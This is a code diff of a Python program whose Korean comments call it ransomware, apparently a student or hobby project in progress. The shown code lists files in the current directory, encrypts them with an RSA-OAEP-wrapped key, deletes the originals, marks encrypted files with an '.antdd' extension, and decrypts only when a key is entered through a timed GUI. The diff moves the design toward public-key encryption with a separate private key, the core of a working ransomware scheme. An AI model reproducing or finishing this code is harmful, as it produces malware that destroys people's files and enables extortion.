@@ -116,6 +116,7 @@ def dec_list_files(path):  # checkPassword에서 password 같은 경우 호출�
     print("dec_filelist: \n", dec_filelist)
     return dec_filelist
 
+
 # /////////////////////////////////////////////////////////////////////////////////////////////////////////////////타이머관련함수
 
 def startTimer(gui, path, ext=None):
@@ -348,17 +349,19 @@ class RealMain:
         # RSA : 키, 싸이퍼 생성
         self.random_generator = Random.new().read
         self.rsa_key = RSA.generate(1024, self.random_generator)  # 키 정보 객체
-        self.cipher = PKCS1_OAEP.new(self.rsa_key)
-        self.private_key = self.rsa_key.export_key()
+        # self.cipher = PKCS1_OAEP.new(self.rsa_key)
+        self.public_key = self.rsa_key.publickey().export_key()  # 공개키
+        self.private_key = self.rsa_key.export_key()  # 비밀키
 
-        self.test_input_key = os.urandom(16) # gui에서 잘 받아오는지 확인하기 위한 변수
+        self.test_input_key = os.urandom(16)  # gui에서 잘 받아오는지 확인하기 위한 변수
 
     def main(self):
         # gui 객체 생성
         gui = tk(parent=self)
 
+        print("공개키는 : ", self.public_key)
         print("비밀키는 : ", self.private_key)
-        print("test_input_key는 : ", str(self.test_input_key)) #랜섬웨어 자체랑 관계 없음 다 지워버려야함
+        print("test_input_key는 : ", str(self.test_input_key))  # 랜섬웨어 자체랑 관계 없음 다 지워버려야함
 
         # timer 테스트
         enc_targetlist = list_files(os.getcwd())  # os.getcwd는 해당 폴더에서 가져옴.
@@ -371,7 +374,7 @@ class RealMain:
         for enc_target in enc_targetlist:
             if enc_target.split('.')[-1] == 'antdd':
                 continue
-            enc(self.key, self.cipher, enc_target, out_filename=None)
+            enc(self.key, PKCS1_OAEP.new(RSA.importKey(self.public_key)), enc_target, out_filename=None) # 공개키로 객체를 만들어서 enc 11/24
             os.remove(original_targetlist[i])  # 원본 파일을 삭제
             i += 1
 
@@ -396,14 +399,17 @@ class RealMain:
             else:
                 print("wrong cipher instance!")
             '''
-            for file in dec_list_files(os.getcwd()):# 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
-                dec(self.cipher, file, out_filename=None)
+            for file in dec_list_files(os.getcwd()):  # 현재 디렉토리 내부에 antdd를 파일리스트로 가져온다
+                # dec(self.cipher, file, out_filename=None)
+                dec(PKCS1_OAEP.new(RSA.importKey(self.private_key)), file, out_filename=None)
+                # 입력한 비밀키를 바탕으로 dec 근데 파라미터 private_key 아니고 input이여야하는데 encoding 문제배제하려고 일단은 private key 사용함 11/24
             print("---dec_by_cipher end")
 
             # gui laughing으로 바꾸는 함수도 호출
             # auto_remove 호출
         else:
             print("self.test_input_key!=input")
+
 
 if __name__ == "__main__":
     rInstance = RealMain()
